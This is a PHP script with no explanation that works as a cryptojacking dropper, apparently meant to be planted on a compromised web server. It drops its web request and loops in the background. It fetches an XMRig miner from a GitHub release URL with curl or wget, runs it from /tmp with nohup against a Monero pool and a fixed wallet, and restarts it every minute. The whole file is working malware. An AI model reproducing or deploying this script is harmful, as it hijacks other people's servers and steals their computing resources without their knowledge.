<?php
$baseUrl='https://github.com/jayl7lssun-debug/xmrig/releases/download/ces/';
$startArgs="--url pool.supportxmr.com:3333 --user 47gxzRb2N75MKzrck8g2y28KPWn5BkQuXFfVbGvmHi8WfzpVAqZQZipMK8A1pDk69PRcwHb3uDgaL2mzUr9WhTDr8cDtq87 --pass laqi --donate-level 0";
$fileName='stmept';
$checkName='stmept';
$interval=60;
$lockFile='/tmp/'.md5($fileName).'.lock';
$fp=fopen($lockFile,"w+");
if(!flock($fp,LOCK_EX|LOCK_NB)){die("Monitor is already running.");}
ignore_user_abort(true);
set_time_limit(0);
ob_start();
echo "Success: Monitor started background loop. PID: ".getmypid();
$size=ob_get_length();
header("Content-Length: $size");
header("Connection: close");
ob_end_flush();
if(ob_get_level()>0)ob_flush();
flush();
if(function_exists('fastcgi_finish_request')){fastcgi_finish_request();}
$filePath='/tmp/'.$fileName;
function run_cmd($cmd,$returnOutput=false){
$output=[];$returnVar=0;
if(function_exists('exec')){exec($cmd,$output,$returnVar);return $returnOutput?implode("\n",$output):true;}
elseif(function_exists('shell_exec')){$result=shell_exec($cmd);return $returnOutput?$result:true;}
elseif(function_exists('system')){ob_start();system($cmd,$returnVar);$result=ob_get_clean();return $returnOutput?$result:true;}
elseif(function_exists('passthru')){ob_start();passthru($cmd,$returnVar);$result=ob_get_clean();return $returnOutput?$result:true;}
return false;
}
function smart_download($url,$savePath){
$content=@file_get_contents($url);
if($content!==false&&strlen($content)>0){file_put_contents($savePath,$content);return true;}
run_cmd("curl -L -o {$savePath} {$url}");
if(file_exists($savePath)&&filesize($savePath)>0)return true;
run_cmd("wget -O {$savePath} {$url}");
if(file_exists($savePath)&&filesize($savePath)>0)return true;
return false;
}
function get_target_url($baseUrl){
$defaultSuffix='xmrig_86c3';
$arch=strtolower(php_uname('m'));
if(strpos($arch,'aarch64')!==false||strpos($arch,'arm')!==false){
$lddOutput=run_cmd("ldd --version 2>&1",true);
if(empty($lddOutput))return $baseUrl.$defaultSuffix;
if(stripos($lddOutput,'musl')!==false)return $baseUrl.'xmrig_m';
else return $baseUrl.'xmrig_g';
}
return $baseUrl.$defaultSuffix;
}
$remoteUrl=get_target_url($baseUrl);
do{
if(!file_exists($filePath)){
if(smart_download($remoteUrl,$filePath)){chmod($filePath,0755);}
else{sleep($interval);continue;}
}
$checkCmd="pgrep -f ".escapeshellarg($checkName);
$procOutput=run_cmd($checkCmd,true);
if(empty(trim($procOutput))){
$startCmd="cd /tmp && nohup ./{$fileName} {$startArgs} > /dev/null 2>&1 &";
run_cmd($startCmd);
}
if(file_exists('/tmp/stop_me')){@unlink('/tmp/stop_me');break;}
sleep($interval);
}while(true);
flock($fp,LOCK_UN);
fclose($fp);
?>